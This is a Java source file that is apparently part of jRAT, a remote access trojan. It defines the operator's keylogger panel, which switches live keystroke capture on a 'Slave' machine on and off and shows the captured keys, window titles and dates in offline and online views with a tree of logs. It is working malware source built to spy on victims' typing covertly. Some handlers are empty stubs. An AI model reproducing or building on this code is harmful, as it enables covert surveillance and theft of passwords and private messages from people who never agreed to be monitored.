package jrat.module.keys.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.keys.packets.PacketToggleLive;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

@SuppressWarnings("serial")
public class PanelKeylogger extends ClientPanel {
	
	public JTextPane offlineTextPane;
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private JCheckBox chckbxDeleteCharOn;
	
	private Style title;
	private Style date;

	private JTree tree;
	private JTextPane onlineTextPane;
	private DefaultMutableTreeNode root;

	public PanelKeylogger(Slave client) {
		super(client, "Keys", Resources.getIcon("keyboard"));

		JToggleButton tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				toggleLive(true);
			}
		});
		buttonGroup.add(tglbtnEnable);

		JToggleButton tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				toggleLive(false);
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);

		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");

		JScrollPane scrollPane_1 = new JScrollPane();

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		
		JPopupMenu popupMenu = new JPopupMenu();
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(tglbtnEnable).addPreferredGap(ComponentPlacement.RELATED).addComponent(tglbtnDisable).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(chckbxDeleteCharOn)).addGroup(groupLayout.createSequentialGroup().addGap(1).addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE))).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 359, Short.MAX_VALUE).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(tglbtnEnable).addComponent(tglbtnDisable).addComponent(chckbxDeleteCharOn)).addGap(15)));

		JScrollPane offlineScrollPane = new JScrollPane();
		tabbedPane.addTab("Offline", Resources.getIcon("offline"), offlineScrollPane, null);
		offlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		offlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);

		offlineTextPane = new JTextPane();
		offlineTextPane.setEditable(false);
		offlineScrollPane.setViewportView(offlineTextPane);

		JScrollPane onlineScrollPane = new JScrollPane();
		onlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		onlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		tabbedPane.addTab("Online", Resources.getIcon("online"), onlineScrollPane, null);

		onlineTextPane = new JTextPane();
		onlineTextPane.setEditable(false);
		onlineScrollPane.setViewportView(onlineTextPane);

		title = offlineTextPane.addStyle("title", null);
		onlineTextPane.addStyle("title", title);
		StyleConstants.setForeground(title, Color.green.darker());
		
		date = offlineTextPane.addStyle("date", null);
		onlineTextPane.addStyle("date", date);
		StyleConstants.setForeground(date, Color.blue);

		tree = new JTree();
		addPopup(tree, popupMenu);
		
		JMenuItem mntmReload = new JMenuItem("Reload");
		mntmReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

			}
		});
		
		popupMenu.add(mntmReload);
		tree.setCellRenderer(new TreeRenderer());
		tree.addTreeSelectionListener(new TreeSelectionListener() {
			public void valueChanged(TreeSelectionEvent event) {
				Object node = event.getPath().getLastPathComponent();

				if (node instanceof DayTreeNode) {
                    final YearTreeNode year = (YearTreeNode) event.getPath().getPath()[1];
                    final MonthTreeNode month = (MonthTreeNode) event.getPath().getPath()[2];
                    final DayTreeNode day = (DayTreeNode) event.getPath().getPath()[3];
                }
			}
		});
		tree.setShowsRootHandles(true);
		root = new DefaultMutableTreeNode("Logs");
		tree.setModel(new DefaultTreeModel(root));
		scrollPane_1.setViewportView(tree);
		setLayout(groupLayout);

		//reloadLogs();
	}

	public DefaultMutableTreeNode getRoot() {
		return root;
	}

	public void toggleLive(boolean enabled) {
	    slave.addToSendQueue(new PacketToggleLive(enabled));
    }

	public synchronized void delete() throws Exception {
		String text = offlineTextPane.getText().trim();
		if (text.endsWith("]")) {
			offlineTextPane.getStyledDocument().remove(text.lastIndexOf("["), text.lastIndexOf("]") - text.lastIndexOf("[") + 1);
		} else {
			offlineTextPane.getStyledDocument().remove(offlineTextPane.getDocument().getLength() - 1, 1);
		}
	}
	
	public void appendOffline(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			} else if (key.startsWith("[Window:")) {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
			} else if (key.startsWith("[Date:")) {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", date);
			} else {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public synchronized void appendOnline(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			}

            onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
		} catch (Exception e) {
			e.printStackTrace();
		}

		onlineTextPane.setSelectionStart(onlineTextPane.getDocument().getLength());
		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());

	}

	public JTree getTree() {
		return tree;
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
